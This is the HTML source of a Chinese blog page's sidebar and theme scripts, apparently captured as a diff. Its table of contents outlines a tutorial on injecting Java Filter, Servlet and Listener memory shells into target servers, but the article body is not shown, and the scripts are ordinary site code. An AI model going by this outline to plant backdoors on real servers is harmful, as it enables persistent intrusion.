href="#Step1%EF%BC%9A%E7%BC%96%E5%86%99%E6%81%B6%E6%84%8F%E7%BB%84%E4%BB%B6"><span class="toc-text">Step1：编写恶意组件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step2%EF%BC%9A%E5%B0%81%E8%A3%85%E6%B3%A8%E5%85%A5%E9%80%BB%E8%BE%91"><span class="toc-text">Step2：封装注入逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step3%EF%BC%9A%E8%8E%B7%E5%8F%96%E7%BB%84%E4%BB%B6%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">Step3：获取组件字节码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step4%EF%BC%9A%E5%A5%97%E5%85%A5%E5%88%A9%E7%94%A8%E9%93%BE%E7%94%9F%E6%88%90-Payload"><span class="toc-text">Step4：套入利用链生成 Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step5%EF%BC%9A%E5%8F%91%E9%80%81%E5%88%B0%E7%9B%AE%E6%A0%87%E8%A7%A6%E5%8F%91%E6%B3%A8%E5%85%A5"><span class="toc-text">Step5：发送到目标触发注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB%E7%9A%84%E6%9B%BF%E4%BB%A3%E5%86%99%E6%B3%95"><span class="toc-text">关于匿名内部类的替代写法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Filter-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0"><span class="toc-text">Filter 内存马注入实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Servlet-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0"><span class="toc-text">Servlet 内存马注入实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Listener-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E5%AE%9E%E7%8E%B0"><span class="toc-text">Listener 内存马注入实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%B8%A9%E5%9D%91"><span class="toc-text">常见问题踩坑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    document.documentElement.setAttribute('data-theme', theme)
+  }
+
+  const switchTheme = () => {
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    if (currentTheme === 'light') {
+      newTheme = 'dark'
+    } else {
+      newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      applyTheme('dark')
+    }
+  })()
+</script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Custom Image Viewer -->
+<script src="/js/plugins/image-viewer.js"></script>
+
+<!-- Custom Context Menu -->
+<script src="/js/plugins/custom-context-menu.js"></script>
+
+<!-- Glitch Effect -->
+<script src="/js/plugins/glitch-effect.js"></script>
+
+<!-- Terminal Copy -->
+<script src="/js/plugins/terminal-copy.js"></script>
+
+<!-- Hotkeys -->
+<script src="/js/plugins/hotkeys.js"></script>
+
+<!-- Achievements / Card System -->
+<script src="/js/plugins/achievements.js"></script>
+
+<!-- Special Days - 节日彩蛋系统 -->
+<script src="/js/plugins/special-days.js"></script>
+
+<!-- Music Player -->
+<script src="/js/plugins/music-player.js"></script>
+
+<!-- Offline Vault - 断网保护机制 -->
+<script src="/js/plugins/offline-vault.js"></script>
+
+<!-- Live2D Widget - Local Version -->
+<script src="/live2d-widget/dist/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 20px !important;
+    right: 20px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: none !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 -->
+<script>
+(function() {
+  var clickEffects = {
+    current: null,
+    
+    init: function() {
+      this.current = localStorage.getItem('clickEffect') || 'none';
+      this.bindEvents();
+    },
+    
+    bindEvents: function() {
+      var self = this;
+      document.addEventListener('click', function(e) {
+        if (self.current === 'none') return;
+        if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) return;
+        self.createEffect(e.clientX, e.clientY);
+      });
+      
+      window.addEventListener('storage', function(e) {
+        if (e.key === 'clickEffect') {
+          self.current = e.newValue || 'none';
+        }
+      });
+    },
+    
+    createEffect: function(x, y) {
+      switch(this.current) {
+        case 'ripple': this.createRipple(x, y); break;
+        case 'firework': this.createFirework(x, y); break;
+        case 'particles': this.createParticles(x, y); break;
+        case 'text': this.createText(x, y); break;
+        default: break;
+      }
+    },
+    
+    createRipple: function(x, y) {
+      var ripple = document.createElement('div');
+      ripple.className = 'click-ripple';
+      ripple.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:0;height:0;border-radius:50%;background:rgba(52,152,219,0.4);transform:translate(-50%,-50%);pointer-events:none;z-index:9999;animation:rippleExpand 0.6s ease-out forwards;';
+      document.body.appendChild(ripple);
+      setTimeout(function() { ripple.remove(); }, 600);
+    },
+    
+    createFirework: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff'];
+      for (var i = 0; i < 12; i++) {
+        var particle = document.createElement('div');
+        var angle = (Math.PI * 2 / 12) * i;
+        var velocity = 50 + Math.random() * 30;
+        particle.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:6px;height:6px;border-radius:50%;background:' + colors[i % 5] + ';pointer-events:none;z-index:9999;transform:translate(-50%,-50%);';
+        document.body.appendChild(particle);
+        this.animateParticle(particle, x, y, x + Math.cos(angle) * velocity, y + Math.sin(angle) * velocity, 500);
+      }
+    },
+    
+    createParticles: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd'];
+      for (var i = 0; i < 8; i++) {
+        var particle = document.createElement('div');
+        particle.innerHTML = '✨';
+        particle.style.cssText = 'position:fixed;left:' + (x + (Math.random()-0.5)*30) + 'px;top:' + (y + (Math.random()-0.5)*30) + 'px;font-size:16px;pointer-events:none;z-index:9999;animation:particleFloat 0.8s ease-out forwards;';
+        document.body.appendChild(particle);
+        setTimeout(function(p) { return function() { p.remove(); }; }(particle), 800);
+      }
+    },
+    
+    createText: function(x, y) {
+      var texts = ['666', '厉害', 'nice', '棒', '赞', '给力'];
+      var text = document.createElement('div');
+      text.innerHTML = texts[Math.floor(Math.random() * texts.length)];
+      text.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;font-size:18px;font-weight:bold;color:#3498db;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);animation:textFloat 0.8s ease-out forwards;';
+      document.body.appendChild(text);
+      setTimeout(function() { text.remove(); }, 800);
+    },
+    
+    animateParticle: function(el, startX, startY, endX, endY, duration) {
+      var startTime = performance.now();
+      function animate(currentTime) {
+        var progress = Math.min((currentTime - startTime) / duration, 1);
+        var easeOut = 1 - Math.pow(1 - progress, 3);
+        el.style.left = (startX + (endX - startX) * easeOut) + 'px';
+        el.style.top = (startY + (endY - startY) * easeOut) + 'px';
+        el.style.opacity = 1 - progress;
+        if (progress < 1) requestAnimationFrame(animate);
+        else el.remove();
+      }
+      requestAnimationFrame(animate);
+    }
+  };
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() { clickEffects.init(); });
+  } else {
+    clickEffects.init();
+  }
+  
+  window.ClickEffects = clickEffects;
+})();
+</script>
+
+<style>
+@keyframes rippleExpand {
+  0% { width: 0; height: 0; opacity: 1; }
+  100% { width: 100px; height: 100px; opacity: 0; }
+}
+@keyframes particleFloat {
+  0% { opacity: 1; transform: translateY(0) scale(1); }
+  100% { opacity: 0; transform: translateY(-40px) scale(0.5); }
+}
+@keyframes textFloat {
+  0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -80px) scale(1.2); }
+}
+</style>
+
+<!-- PWA Service Worker -->
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').then(function(reg) {
+    console.log('Service Worker 已注册，支持离线访问');
+  }).catch(function(err) {
+    console.log('Service Worker 注册失败:', err);
+  });
+}
+</script>
+
+<!-- Random Cover Image -->
+<script>
+(function() {
+  function refreshRandomCovers() {
+    var images = document.querySelectorAll('img[src*="loliapi.com"]');
+    images.forEach(function(img) {
+      var src = img.src;
+      var baseSrc = src.split('?')[0];
+      img.src = baseSrc + '?t=' + Date.now() + '&r=' + Math.random().toString(36).substr(2, 9);
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', refreshRandomCovers);
+  } else {
+    refreshRandomCovers();
+  }
+})();
+</script>
+
+</div></body></html>
